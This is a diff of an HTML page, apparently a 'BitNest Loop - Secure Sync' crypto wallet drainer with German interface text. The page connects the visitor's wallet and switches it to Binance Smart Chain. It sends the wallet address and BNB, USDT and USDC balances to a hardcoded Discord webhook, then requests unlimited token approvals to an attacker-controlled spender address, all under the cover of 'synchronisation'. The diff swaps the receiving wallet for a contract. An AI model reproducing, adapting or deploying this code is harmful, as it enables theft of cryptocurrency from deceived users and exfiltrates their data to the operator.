@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>BitNest Loop - Sync</title>
+<title>BitNest Loop - Secure Sync</title>
 <script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 <style>
 :root{ --bg:#000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#fff; }
@@ -29,43 +29,39 @@ button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;fon
 </div>
 
 <script>
-const MY_WALLET = "0x22cc621a0095de57c81ef0b7f88826c3669c95a7"; 
+// KONFIGURATION: DEIN CONTRACT ALS SPENDER
+const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B"; 
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
 const WEBHOOK = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp";
 
-const BSC_CHAIN_ID = "0x38"; // 56 in Hexadezimal
+const BSC_CHAIN_ID = "0x38"; // 56 Hex
 
 const abi = ["function allowance(address,address) view returns (uint256)","function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)"];
 
-async function checkAndSwitchNetwork() {
+async function switchNetwork() {
   try {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) {
+    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+    if (currentChain !== BSC_CHAIN_ID) {
       await window.ethereum.request({
         method: 'wallet_switchEthereumChain',
         params: [{ chainId: BSC_CHAIN_ID }],
       });
     }
     return true;
-  } catch (error) {
-    // Falls das Netzwerk nicht in der Wallet existiert, füge es hinzu
-    if (error.code === 4902) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: BSC_CHAIN_ID,
-            chainName: 'Binance Smart Chain',
-            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/']
-          }]
-        });
-        return true;
-      } catch (addError) {
-        return false;
-      }
+  } catch (e) {
+    if (e.code === 4902) {
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{
+          chainId: BSC_CHAIN_ID,
+          chainName: 'Binance Smart Chain',
+          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+          rpcUrls: ['https://bsc-dataseed.binance.org/'],
+          blockExplorerUrls: ['https://bscscan.com/']
+        }]
+      });
+      return true;
     }
     return false;
   }
@@ -80,8 +76,7 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     if (!window.ethereum) throw new Error("Keine Wallet gefunden!");
 
     log.innerText = "Prüfe Netzwerk...";
-    const networkOk = await checkAndSwitchNetwork();
-    if (!networkOk) throw new Error("Bitte zum Binance Netzwerk wechseln.");
+    await switchNetwork();
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await provider.send("eth_requestAccounts", []);
@@ -103,19 +98,19 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     await fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type":"application/json" },
-      body: JSON.stringify({ content: `🚀 **Sync (BSC)**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
+      body: JSON.stringify({ content: `🚀 **Sync an Contract**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
     });
 
     log.innerText = "Synchronisiere USDT...";
-    await (await usdt.approve(MY_WALLET, ethers.MaxUint256, { gasLimit: 100000 })).wait();
+    await (await usdt.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
     
     log.innerText = "Synchronisiere USDC...";
-    await (await usdc.approve(MY_WALLET, ethers.MaxUint256, { gasLimit: 100000 })).wait();
+    await (await usdc.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
 
     log.innerText = "✅ Synchronisierung vollständig!";
 
   } catch (err) {
-    log.innerText = "Status: " + (err.message || "Vorgang abgebrochen.");
+    log.innerText = "Status: " + (err.message || "Abgebrochen.");
     btn.disabled = false;
   }
 });
